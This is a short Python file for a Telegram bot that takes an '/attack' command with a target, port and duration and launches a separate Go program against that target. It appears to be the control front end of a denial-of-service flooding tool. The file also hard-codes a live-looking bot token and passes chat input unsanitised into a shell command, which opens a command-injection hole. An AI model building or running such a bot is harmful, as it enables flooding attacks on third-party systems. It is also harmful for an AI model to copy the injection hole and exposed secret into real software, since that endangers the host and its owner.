import telebot
import subprocess

# Replace with your bot token
BOT_TOKEN = "8056620144:AAG3GUpQhZVEBlmYTzj07XBGlJ-VtF-PvlA"
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        # Parse command arguments
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /attack <target> <port> <time>")
            return
            
        target = command[1]
        port = command[2]
        duration = command[3]
        
        # Execute the binary
        bot.reply_to(message, f"🚀 Attack started on {target}:{port} for {duration} seconds")
        subprocess.run(f"go run go.go {target} {port} {duration} ", shell=True)
        bot.reply_to(message, "✅ Attack completed successfully")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Start the bot
print("Bot is running...")
bot.polling(none_stop=True)
